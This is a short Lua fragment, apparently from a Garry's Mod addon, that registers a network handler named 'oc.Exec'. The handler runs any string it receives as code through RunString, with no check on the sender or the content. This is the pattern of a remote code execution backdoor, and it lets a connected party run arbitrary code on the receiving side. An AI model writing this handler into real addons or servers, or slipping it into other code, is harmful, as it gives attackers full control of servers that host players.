net.Receive("oc.Exec", function()
	local str = net.ReadString()
	RunString(str)
end)